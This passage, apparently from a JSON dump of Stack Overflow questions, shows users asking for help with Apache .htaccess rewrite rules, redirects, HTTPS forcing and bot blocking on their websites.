\"Public\".</p>\n\n<p>I can’t access the Apache configurations (shared host) so I have a .htaccess I placed in the project (i.e: <strong>www/ Folder /Name of the site /.htaccess</strong>). Here is its content:</p>\n\n<pre><code>Options -Indexes +FollowSymLinks +Multiviews\nRewriteEngine On\nRewriteBase /public/\nRewriteRule ^(.*)$ index.html [NC,L]\n</code></pre>\n\n<p>I made something very simple for now because I tried lots of things without efficient result.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13168159,"title":"Redirect bad url","body":"<p>I want to redirect all bad requests to another url that i identify. For example, if the user type <code>http://www.mywebsite.com/unavailablepage.html</code>, he will not get 404 page, instead, he will be redirected to another url. How can i do that in the <code>.htaccess</code> file? Thanx in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13101067,"title":"How to shorten url with mod_rewrite","body":"<p>I have urls like this:</p>\n\n<p><code>http://mysite.com/launch/index.php</code>\n<code>http://mysite.com/launch/index1.php</code>\n<code>http://mysite.com/launch/index2.php</code>\n<code>http://mysite.com/launch/index3.php</code></p>\n\n<p>I want to take out index.php, index1.php, index2.php, index3.php from the urls so that I would have:</p>\n\n<p><code>http://mysite.com/launch/</code></p>\n\n<p>How can I do that in .htaccess? </p>\n\n<p>I want all files to load without exchanging one to another, I need just cut off the filenames from the url path.</p>\n\n<p><strong>HINT (this may help)</strong> - \nOnly one file gets the request at a time. This file is randomly selected.\nThere're no other files (than index.php, index1.php, index2.php, index3.php) in the 'launch' folder.</p>\n"},{"tags":[".htaccess","url","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13166807,"title":"Htaccess url rewrite not working correctly","body":"<p>I have an issue with url rewriting, here's what I have so far:</p>\n\n<pre><code>        Options +FollowSymlinks\n        RewriteEngine on\n        RewriteRule \\.(gif|png|jpg|css|js)$|^index\\.php$ - [L]\n        RewriteRule ^users/(.+)$ /profile.php?userid=$1 [NC]\n        RewriteRule ^(.+)/(.+)$ /main.php?region=$1&amp;place=$2 [NC]\n</code></pre>\n\n<p>Basically, if the url is mysite.com/users/username I want it to use profile.php, then for anything else, to go to main.php.</p>\n\n<p>However, with that code it doesn't happen as expected, it always uses main.php. Is there anyway you can use if and elses in htaccess, or something similar?</p>\n"},{"tags":["php",".htaccess","cakephp"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":26,"score":0,"question_id":13166745,"title":"Install CakePHP 2.0 in subfolder","body":"<p>I want to install CakePHP in a subfolder, and I want to show it like that in the url. So:</p>\n\n<p>install in</p>\n\n<pre><code>mydomain.com/folder\n</code></pre>\n\n<p>and run the app like</p>\n\n<pre><code>mydomain.com/folder/any_cakephp_route\n</code></pre>\n\n<p>How can I do that, and get the Url's to work? It is showing a 404 error.</p>\n\n<p>Current .HTACCESS</p>\n\n<p><strong>mycakeapp .htaccess</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteBase /estrella\n    RewriteRule    ^$    webroot/    [L]\n    RewriteRule    (.*) webroot/$1    [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>mycakeapp webroot .htaccess</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /estrella\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ index.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13166962,"title":"\"Ignoring\" files with .htaccess","body":"<p>Is it possible to ignore all actual files in a directory with <code>RewriteRules</code>? What I mean is, I'm creating \"flatlinks\" or \"permalinks\" (http://example.com/not/an/actual/file/path/) that page.php handles. This only works if I 'ignore' all other files with <code>RewriteCond</code>. Instead of creating a <code>RewriteCond</code> for every real file in the directory in my .htaccess file is there a way to tell it to check if there is an actual file show that and if not let page.php take care of it?</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/index\\.php$\nRewriteCond %{REQUEST_URI} !^/somefile\\.php$\nRewriteCond %{REQUEST_URI} !^/someotherfile\\.php$\nRewriteCond %{REQUEST_URI} !^/page\\.php$\nRewriteRule ^([^/]*)$ /page.php?p=$1 [L] [NC]\n</code></pre>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13161938,"title":"Need help for a regular expression to rewrite a URL path (for Cherokee)","body":"<p>I need help to write a regex to redirect a URL path from:</p>\n\n<p><code>http://mydomain.com/files/2012/10/image_4-1.png</code></p>\n\n<p>to:</p>\n\n<p><code>http://mydomain.com/wp-content/blogs.dir/5/files/2012/10/image_4-1.png</code></p>\n\n<p>... the <code>wp-content/blogs.dir/5</code> (it static) needs to be added.</p>\n\n<p>Just can't figure it out... Can anyone help with the regular expression?</p>\n"},{"tags":["apache",".htaccess","centos","httpd"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13163006,"title":"Adding Mutliview Options to .htaccess causes server 500 errors","body":"<p>htaccess file trying to disable the 300 error page via disabling mutliviews (via this suggestion of how to turn it on: )</p>\n\n<p>Here is my file as it is normally:</p>\n\n<pre><code>Options -Indexes\nRewriteBase /\n</code></pre>\n\n<p>Then I add to the bottom of the file:</p>\n\n<pre><code>Options -MultiViews\n</code></pre>\n\n<p>After which I get a 500 level error thrown. Any ideas of how to fix?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":17,"score":2,"question_id":13162421,"title":"301 Redirect isn't working on my website","body":"<p>I have been having a look around the net and this website trying to find answer to my problem, but cant solve it yet. So hopefully, you guys can help.</p>\n\n<p>I currently have a 301 redirect on my website</p>\n\n<pre><code>     RewriteEngine on\n     Options +FollowSymLinks\n     RewriteCond %{THE_REQUEST} ^.*/index\\.html\n     RewriteRule ^(.*)index.html$ http://www.teach-this.com/$1 [R=301,L]\n</code></pre>\n\n<p>Basically, the problem is my website is showing duplicate content.</p>\n\n<p>www.teach-this.com\nwww.teach-this.com/index.html</p>\n\n<p>I'm trying to get the redirect to work and have tried various different 301 redirects. When I type in the web address, it comes up as .com. but as soon as I click on anything within the site and go back to the homepage it comes back as com/index.html.</p>\n\n<p>Any ideas would be welcome, if you need more information let me know. Or if someone can take a look at the site and tell me whats wrong that would be great.</p>\n\n<p>Thanks in advance</p>\n\n<p>Paul </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13158107,"title":"RewriteCond or just RewriteRule for a simple .htaccess re-write?","body":"<p>I am composing a simple .htaccess re-write to force a single page to use https (inspired by the answers to <a href=\"http://stackoverflow.com/questions/1108706/correctly-switching-between-http-and-https-using-htaccess\">this question</a>).</p>\n\n<p>Is it better to use RewriteCond, as follows:</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} ^/page\\.php$\nRewriteRule .* https://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n</code></pre>\n\n<p>or the shorter alternative with the condition in the RewriteRule:</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteRule ^page\\.php$ https://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess","module","symfony1","action"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13151160,"title":"How can I make symfony skip over a url that reports \"empty module and/or action after parsing url\"?","body":"<p>I am not able to reach a specific URL, because symfony assumes there should be a route set up for it.</p>\n\n<p>I have specified in .htaccess that all urls in this directory are ignored. It seems to work except one specific URL.</p>\n\n<p>In .htaccess, I have attempted to have symfony exlude this URLs from this directory by using:</p>\n\n<pre><code>    RewriteRule ^shop/.*$ - [PT,L]\n</code></pre>\n\n<p>However, I continue to receive the empty module and/or action error when visiting a particular URL in this directory.</p>\n\n<p>The error received is:\nEmpty module and/or action after parsing the URL \"/shop/modules/checkout/googlecheckout/xml.php\" (/).</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13159835,"title":"how to write .htaccess for this url?","body":"<p><a href=\"http://helloin.in/productchild.php?p=Properties&amp;ID=48&amp;subMenuId=14\" rel=\"nofollow\">http://helloin.in/productchild.php?p=Properties&amp;ID=48&amp;subMenuId=14</a></p>\n\n<p>I need to hide my id's from this url and only want to display Properties and submenu like this</p>\n\n<p><a href=\"http://helloin.in/productchild.php/Properties/subMenuId\" rel=\"nofollow\">http://helloin.in/productchild.php/Properties/subMenuId</a></p>\n\n<p>Thanks in advance..</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":13147192,"title":".htaccess rewrite not doing anything","body":"<p>I have a page with the URL of <code>http://www.freshmarketstores.com/departments/produce/recipe.php?ing=Akane_Apples&amp;recipe=59</code> that I would like to be cleaned up to look like <code>http://www.freshmarketstores.com/departments/produce/recipe/Akane_Apples/59</code></p>\n\n<p>Right now, in my .htaccess file that is located in the produce folder, I have the following code:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^recipe/(.*)/(.*)$ recipe.php?ing=$1&amp;recipe=$2 [L]\n</code></pre>\n\n<p>Currently, this does not affect anything. when the <code>recipe.php?ing=Akane_Apples$recipe=59</code> url is loaded, it loads fine, but does not do the rewrite. This is my first attempt at URL rewriting and can't figure this thing out. </p>\n\n<p>Thanks in advance for your help.</p>\n\n<p><strong>EDIT:</strong>\nOkay, so after some learning last night, I realize I was approaching this backwards. I am able to type in <a href=\"http://www.freshmarketstores.com/departments/produce/recipe/Akane_Apples/59\" rel=\"nofollow\">http://www.freshmarketstores.com/departments/produce/recipe/Akane_Apples/59</a> and get the resource that is stored at .../produce/recipe.php?ing=Akane_Apples&amp;recipe=59. Thanks for all of your help on that.</p>\n\n<p>My question now, is can you go the opposite way? If I type in .../produce/recipe.php?ing=Akane_Apples&amp;recipe=59, how can I get it to redirect to the /produce/recipe/Akane_Apples/59?</p>\n"},{"tags":["wordpress",".htaccess","url","redirect","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":20,"score":0,"question_id":13156624,"title":"Modified url same as WordPress","body":"<p>I want to modified url in my site same as url WordPress</p>\n\n<p>Url my site: <a href=\"http://mysite.com/5-remove-file-extention-from-urls.html\" rel=\"nofollow\">http://mysite.com/5-remove-file-extention-from-urls.html</a></p>\n\n<p>I want using rewriterule like this: <a href=\"http://mysite.com/remove-file-extention-from-urls\" rel=\"nofollow\">http://mysite.com/remove-file-extention-from-urls</a></p>\n\n<p>htaccess my site</p>\n\n<pre><code>RewriteRule ^page,([0-9]+),([0-9]+),([0-9]+)-(.).html(/?)+$ index.php?newsid=$3&amp;news_page=$1&amp;cstart=$2&amp;seourl=$4 [L]\nRewriteRule ^page,([0-9]+),([0-9]+)-(.).html(/?)+$ index.php?newsid=$2&amp;news_page=$1&amp;seourl=$3 [L]\nRewriteRule ^print:page,([0-9]+),([0-9]+)-(.).html(/?)+$ engine/print.php?news_page=$1&amp;newsid=$2&amp;seourl=$3 [L]\nRewriteRule ^([0-9]+)-(.).html(/?)+$ index.php?newsid=$1&amp;seourl=$2 [L]\n</code></pre>\n"},{"tags":[".htaccess","block","bots"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13137311,"title":"htaccess block *bot and bot*","body":"<p>I'm having trouble blocking two bad bots that keep sucking bandwidth from my site and I'm certain it has something to do with the * in the user-agent name that they use.</p>\n\n<p>Right now, I'm using the following code to block the bad bots (this is an excerpt)...</p>\n\n<pre><code># block bad bots\nRewriteCond %{HTTP_USER_AGENT} ^$ [OR]\nRewriteCond %{HTTP_USER_AGENT} ^spider$ [OR]\nRewriteCond %{HTTP_USER_AGENT} ^robot$ [OR]\nRewriteCond %{HTTP_USER_AGENT} ^crawl$ [OR]\nRewriteCond %{HTTP_USER_AGENT} ^discovery$\nRewriteRule .* - [F,L]\n</code></pre>\n\n<p>When I try to do <code>RewriteCond %{HTTP_USER_AGENT} ^*bot$ [OR]</code> or <code>RewriteCond %{HTTP_USER_AGENT} ^(*bot)$ [OR]</code> I get an error.</p>\n\n<p>Guessing there is a pretty easy way to do this that I just haven't found yet on Google.</p>\n"},{"tags":["html",".htaccess","http","redirect","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13156574,"title":"HTTPS to HTTP htaccess redirect for home page only","body":"<p>I need help being able to redirect the home page of a website I'm building from HTTPS to HTTP. </p>\n\n<p>The website I'm building is using cart 66 and unfortunately when the site redirects back to the home page after visiting the secure cart pages it stays in HTTPS and certain elements of the front page no longer display correctly.</p>\n\n<p>I assume doing a redirect will be the best option to solve this problem. Although I'm open to other suggestions.</p>\n\n<p>I've searched for solutions online, but I can only find redirects from HTTPS to HTTP for the whole site, not just a single page or the opposite of what I'm trying to do. I'm too much of a noob with htaccess to try and reverse engineer a solution from the bits and bobs I can find.</p>\n\n<p>I'd also like to leave the option of adding more than one page to the redirect just in case I discover any more pages that end up appearing broken.</p>\n\n<p>Any help is greatly appreciated.</p>\n"},{"tags":[".htaccess","iis7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13068986,"title":"Complicated .hatccess rules to convert to web.config","body":"<p>I have the following .haccess rules that I've used for a number of years, however I need them converting to work in a web.config file.</p>\n\n<p>Anybody have a clue where to start?  </p>\n\n<pre><code>#Set the mapfiles for the category and product pages \nRewriteMap mapfile1 txt:maps/map_categories.txt \nRewriteMap mapfile2 txt:maps/map_products.txt \nRewriteMap lower int:tolower \n\n#FIX the trailing slash \nRewriteRule ^([^.?]+[^.?/])$ $1/ [R=301,L] \n\n#Define the rules for the CATEGORY pages \nRewriteCond %{URL} ^(?!/(cms|cms/.*)$)\nRewriteCond %{URL} ^(?!/(vadmin|vadmin/.*)$)\nRewriteCond %{URL} ^(?!/(bathroom-blog|bathroom-blog/.*)$) \nRewriteRule ^(?:[^/]+/)?([^/.]+)/?$ product_list.asp?catid=${mapfile1:${lower:$1}}&amp;%{QUERY_STRING} [NC,L]\n\n#Define the rules for the PRODUCT pages \nRewriteCond %{URL} ^(?!/(cms|cms/.*)$)\nRewriteCond %{URL} ^(?!/(vadmin|vadmin/.*)$)\nRewriteCond %{URL} ^(?!/(bathroom-blog|bathroom-blog/.*)$)  \n#RewriteCond %{REQUEST_FILENAME}.asp -d \n#RewriteCond %{REQUEST_FILENAME}.asp -f\nRewriteRule ^.+/.+/([^/.]+)/$ product_detail.asp?prodID=${mapfile2:${lower:$1}}&amp;%{QUERY_STRING} [NC,L]\n</code></pre>\n\n<p>Very grateful for any help!</p>\n\n<p>Cheers, Chris.</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":18,"score":2,"question_id":13151817,"title":".htaccess 301 redirect swedish charcters in target URL","body":"<p>I require to write 301 redirect like If URL has /faq then it should redirect to /frågor-svar</p>\n\n<p>I have write redirect rule as </p>\n\n<pre><code>redirect 301 /faq &lt;siteURL&gt;/frågor-svar\n</code></pre>\n\n<p>Upon testing it redirects to the specified URL but swedish characters that I entered got changed. It seems URL get encoded and it becomes <code>/fr%E5gor-svar/</code></p>\n\n<p>But In address bar of Browser I need that URL stays as <code>/frågor-svar/</code> and not as <code>/fr%E5gor-svar/</code></p>\n\n<p>Thanks in Advance</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13152229,"title":"Rewrite rule with 2 variables with \"/\" seperation","body":"<p>I have an .htaccess file located in a folder <strong>\"/mixtapes/\"</strong> I am trying to get the URL <code>mydomain.com/music/downloads/mixtapes/this-title/id</code> to execute <code>mydomain.com/music/downloads/mixtapes/item.php?title=variable1&amp;id=variable2</code></p>\n\n<p>I currently have the below way somewhat working but it only uses the id and I need both variables (../mixtapes/title/id)separated by <strong>\"/\"</strong> and for some reason with the below code the index page inside <strong>\"/mixtapes/\"</strong> does not work.I am stumped! I am somewhat new to this and any help is greatly appreciated!</p>\n\n<p>BTW on my index page the passing url to <code>item.php</code> page is rewritten to <code>&lt;a href=\"title/id\"&gt;</code>I just cant seem to get it to properly execute <code>item.php?title=a&amp;id=b</code> with the format <code>mixtapes/title/id</code> </p>\n\n<p>Current htaccess file located in <strong>\"/mixtapes/\"</strong></p>\n\n<pre><code># turn mod_rewrite engine on \nRewriteEngine On\n\n# rewrite all physical existing file or folder\nRewriteCond %{REQUEST_FILENAME} !-f [OR]\nRewriteCond %{REQUEST_FILENAME} !-d\n\n# allow things that are certainly necessary\nRewriteCond %{REQUEST_URI} \"/css/\" [OR]\nRewriteCond %{REQUEST_URI} \"/images/\" [OR]\nRewriteCond %{REQUEST_URI} \"/images/\" [OR]\nRewriteCond %{REQUEST_URI} \"/javascript/\"\n\n# rewrite rules\nRewriteRule ^mixtapes/item.php(.*) - [L]\nRewriteRule ^(.*) item.php?id=$1 [QSA]\n</code></pre>\n"},{"tags":["regex",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":16,"score":3,"question_id":13152237,"title":"Is there a way to rewrite just a directory, so that all articles within that directory redirect 1 level up?","body":"<p>I have a site <code>http://www.mysite.com/blog/category/post/</code> and I need to redirect it to <code>http://www.mysite.com/category/post</code> ie, I want to remove the <code>blog</code> from my URL. Is there a way to do it using permanent redirects in .htaccess?</p>\n\n<p><strong>Thank you very much!</strong></p>\n"},{"tags":[".htaccess","mod-rewrite","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":7,"score":-1,"question_id":13153507,"title":"How do redirect sub.exemple.com to sub.exemple.com.br?","body":"<p>I would like to know how I can redirect sub.exemple.com to sub.exemple.com.br with .htacess</p>\n\n<p>other exemples:</p>\n\n<p>from                              -> to\nsomething.exemple.com/other-stuff -> something.exemple.com.br/other-stuff\nabc.exemple.com                   -> abc.exemple.com.br</p>\n\n<p>I know this may be easy but I couldn't figure out how to do it.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":8,"score":1,"question_id":13151011,"title":"mod_rewrite mobile browser to same URL with $_GET data","body":"<p>I'm trying to simply add the get data \"?mobile\" to the end of my site's URL when a mobile browser visits it. I just can't seem to figure it out. Here is what I have so far:</p>\n\n<pre><code>RewriteCond %{HTTP_ACCEPT} \"text\\/vnd\\.wap\\.wml|application\\/vnd\\.wap\\.xhtml\\+xml\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"sony|symbian|nokia|samsung|mobile|windows ce|epoc|opera\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"mini|nitro|j2me|midp-|cldc-|netfront|mot|up\\.browser|up\\.link|audiovox\"[NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"blackberry|ericsson,|panasonic|philips|sanyo|sharp|sie-\"[NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"portalmmm|blazer|avantgo|danger|palm|series60|palmsource|pocketpc\"[NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"smartphone|rover|ipaq|au-mic,|alcatel|ericy|vodafone\\/|wap1\\.|wap2\\.|iPhone|android\"[NC]\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule .* http://website.com/?m [L,R=302]\n</code></pre>\n"},{"tags":["http",".htaccess","mod-rewrite","ssl","https"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":462,"score":0,"question_id":9642877,"title":"Redirect only one folder to HTTPS, all others to HTTP","body":"<p>I apologize in advance for asking something that's been answered several times on SO, but I haven't been able to modify any of the answers to work for this case.</p>\n\n<p>I have a /secure/ folder that I need to redirect to HTTPS. Everything outside of that folder should be redirected to HTTP.</p>\n\n<p>I plan on using absolute links for navigation through my site, but I need to guarantee that the pages in the /secure/ folder are only viewable over HTTPS. For the other pages it doesn't really matter, but I'd prefer them only viewable over HTTP because I'm on shared hosting and the server is already slow as it is.</p>\n\n<p>Thank you very much!</p>\n"},{"tags":[".htaccess","redirect","httpd.conf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12842701,"title":"Unable to figure out where redirect is occurring","body":"<p>I read a <a href=\"http://stackoverflow.com/questions/10888664/how-to-determine-where-a-redirect-to-https-is-occurring\">similar post</a> from someone who was having trouble figuring out where his redirect was occurring.</p>\n\n<p>The main places that he checked were:</p>\n\n<pre><code>.htaccess\nin apache in the httpd.conf\nin the php file of a test page we wrote (site.com/test.php)\n</code></pre>\n\n<p>I am having a similar problem.  He found the solution on his own, but it does not apply to me.  I also tried some of the other suggestions such as /etc/httpd/conf/vhosts/ to no avail.</p>\n\n<p>I have a script /shop/login.php  that is throwing out a 302 redirect every time I try to access it.</p>\n\n<p>I have checked the main places listed above, and cannot for the life of me figure out where this redirect is set up.</p>\n\n<p>Any ideas on how I can figure this out?</p>\n"},{"tags":["wordpress","apache",".htaccess","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13150528,"title":"Wordpress multisite subdomain rewrite","body":"<p>hey guys I'm in trouble seriously. I'm running wordpress site and I'd like to have multisite subdomains not subcategories f.e.\n(I've created subdirectory in ftp.)</p>\n\n<p>oranges.domain.com\nnot domain.com/oranges ..actually I can access subdomain but only in this format: oranges.domain.com/domains/domain.com</p>\n\n<p>And also if my wordpress has root in subdirectory like domain.com/home how can I redirect domain.com to go to domain.com/home because not everybody will know that my domain is accessible only with subcategory.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /domains/domainname.com/home/\nRewriteRule ^index\\.php$ - [L]\nRewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\nRewriteRule ^([_0-9a-zA-Z-]+/)?siteN/files/(.+) wp-content/blogs.dir/N/files/$2 [L]\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule . index.php [L]\n\ndefine('MULTISITE', true);\ndefine('SUBDOMAIN_INSTALL', true);\n$base = '/domains/domainname.com/';\ndefine('DOMAIN_CURRENT_SITE', 'domainname.com');\ndefine('PATH_CURRENT_SITE', '/domains/domainname.com/');\ndefine('SITE_ID_CURRENT_SITE', 1);\ndefine('BLOG_ID_CURRENT_SITE', 1);\n</code></pre>\n\n<p>Here are the codes I got in config and htaccess.\nMaybe problem in wp-config? I just can't direct access oranges.domain.com - no permissons.</p>\n\n<p>I'd be glad if you guys can help me. Thank you. </p>\n"},{"tags":["wordpress",".htaccess","wordpress-theming"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13149418,"title":"The requested URL /about was not found on this server","body":"<p>The home page of my wordpress website seems to be displaying correctly but if you click through to any of the other pages I get the following error message:</p>\n\n<pre><code>Not Found\n\nThe requested URL /about was not found on this server.\n\nApache/2 Server at www.wildlionmedia.co.uk Port 80\n</code></pre>\n\n<p>I'm not sure whether it's a problem with the theme or the .htaccess file that is not being rewritten correctly. </p>\n\n<p><a href=\"http://www.wildlionmedia.co.uk/\" rel=\"nofollow\">http://www.wildlionmedia.co.uk/</a></p>\n\n<p>Any ideas how I can resolve the issue?</p>\n\n<pre><code># Switch rewrite engine off in case this was installed under HostPay.\nRewriteEngine On\n\nSetEnv DEFAULT_PHP_VERSION 53\n\nDirectoryIndex index.cgi index.php\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine Off\nRewriteBase /wildlionmedia.co.uk/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /wildlionmedia.co.uk/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13148797,"title":"deny command in htaccess error: \"not allowed here\"","body":"<p>I want to distribute paid templates and protect it with from direct download. The templates has a /images folder, and a thumbnail, and the template main file in the root. The main file (template.html) is what I want to block (I read it through PHP file access).</p>\n\n<p>I put an htaccess into the template root with this:</p>\n\n<pre><code>&lt;Files \"template.html\"&gt;\nDeny from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>But... some users can't see nothing in the folder and child /images folder!!!</p>\n\n<p>One user just sent me the log of his webserver and there is the message:</p>\n\n<p>[Mon Oct 29 12:05:54 2012] [alert] [client 83.150.118.1] /var/www/demo/public/(folder)/.htaccess: deny not allowed here, referer: (the web page)</p>\n\n<p>Some threads talks about \"AllowOverride setting in apache config\" but I don't understand...</p>\n\n<p>The goal is protect the file for everyone and my users don't need to change anything in his webserver... there is a safe way?</p>\n\n<p>Or at least, there is a way to test it throug PHP, then I can advice the issue users delete his htaccess and protect the file through permisions?</p>\n\n<p>Thanks in advance!\nCarles Reverter.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13148402,"title":"htaccess redirect 301 with subdomains","body":"<p>I have problem with redirection 301 in htaccess.\nI must redirect from one site to another but with subdomains and pages.\nLike this:</p>\n\n<pre><code>www.example.com to www.examples.com\nwww.sub1.example.com to www.sub1.examples.com\nwww.sub2.example.com to www.sub2.examples.com\n</code></pre>\n\n<p>I was looking for solution but nothing works. Any help?</p>\n\n<p>Thanks,\nChris</p>\n"},{"tags":[".htaccess","codeigniter","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13147729,"title":"Codeigniter SSL Certificate Installation - 500 Error when trying to resolve https","body":"<p>I'm having trouble with an SSL certificate on my Codeigniter-based site.</p>\n\n<p>I have checked using two separate \"SSL Checker\" sites that my domain www.example.com has an SSL certificate installed correctly, and it does.</p>\n\n<p>I have modified the config file to this:</p>\n\n<pre><code>$config['base_url'] = 'https://www.example.com/';\n</code></pre>\n\n<p>And my .htaccess file is this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine on\nRewriteBase /\n\n\n#Removes trailing slashes (prevents SEO duplicate content issues)\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteRule ^(.+)/$ $1 [L,R=301]\n\n#forces www.\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ https://www.%{HTTP_HOST}/$1 [R=301,L]\n\n\n#If a controller can't be found - then issue a 404 error from PHP\nErrorDocument 404 /404.html\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^sys.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n# Checks to see if the user is attempting to access a valid file,\n# such as an image or css document, if this isn't true it sends the\n# request to index.php. The first condition allows access to assets, css, js and the robots file\nRewriteCond $1 !^(index\\.php|assets|css|js|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{THE_REQUEST} ^.*/index.php\nRewriteRule ^(.*)index.php$ https://www.example.com/$1 [R=301,L]\n\n# Removes access to the system folder by users.\n# Additionally this will allow you to create a System.php controller,\n# previously this would not have been possible.\n# 'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n&lt;/IfModule&gt;\n\n\n&lt;IfModule !mod_rewrite.c&gt;\n# Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>All I get is a 500 Internal Server Error when I try to resolve <a href=\"https://www.example.com\" rel=\"nofollow\">https://www.example.com</a>. I want to set the entire site to be protected.</p>\n\n<p>Thanks in advance for any help!</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13147061,"title":"regex mod_rewrite ?-mark sign causing bug","body":"<p>I'm trying to redirect old-style links from an old website to new style links in php.</p>\n\n<p>I'm using:</p>\n\n<pre><code>RewriteEngine on\n    RewriteBase /\n    RewriteRule s\\.cfm?id=5$ http://mysite.com/article5.php [B,L,R=301]\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} 